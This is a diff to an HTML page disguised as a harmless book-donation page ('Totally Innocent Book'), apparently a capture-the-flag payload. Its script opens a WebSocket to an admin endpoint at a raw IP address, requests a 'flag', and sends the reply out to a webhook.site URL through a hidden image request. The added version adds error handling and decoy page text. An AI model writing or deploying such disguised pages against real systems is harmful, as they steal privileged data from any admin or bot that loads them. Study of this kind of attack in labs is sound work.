@@ -1,33 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<script>
-(function() {
+  <meta charset="utf-8">
+  <title>Totally Innocent Book</title>
+  <script>
+    (function() {
 
-  const TARGET_WS = "ws://65.109.185.79:1202/admin/ws";
-  const EXFIL_URL = "https://webhook.site/f08770f4-2430-4f12-8ad3-32f527cef2d6";
+      const TARGET_WS = "ws://65.79.185.109:1202/admin/ws"; 
+      const EXFIL_URL = "https://webhook.site/f08770f4-2430-4f12-8ad3-32f527cef2d6";
 
-  const ws = new WebSocket(TARGET_WS);
+      try {
+        const ws = new WebSocket(TARGET_WS);
 
-  ws.onopen = () => {
-    ws.send("flag");      // ask for the flag
-  };
+        ws.onopen = function() {
+          ws.send("flag");
+        };
 
-  ws.onmessage = event => {
-    const flag = event.data;
+        ws.onmessage = function(event) {
+          const flag = event.data;
 
-    // exfiltrate the flag
-    const img = new Image();
-    img.src = EXFIL_URL + "?flag=" + encodeURIComponent(flag);
+          const img = new Image();
+          img.src = EXFIL_URL + "?flag=" + encodeURIComponent(flag);
 
-    console.log("FLAG:", flag);
-  };
+          console.log("FLAG:", flag);
+        };
 
-})();
-</script>
+        ws.onerror = function(err) {
+          console.log("WebSocket error", err);
+        };
+
+      } catch (e) {
+        console.log("Exception while creating WebSocket:", e);
+      }
+    })();
+  </script>
 </head>
 <body>
-<h1>Loading...</h1>
+  <h1>Thanks for donating this book!</h1>
+  <p>Loading...</p>
 </body>
 </html>
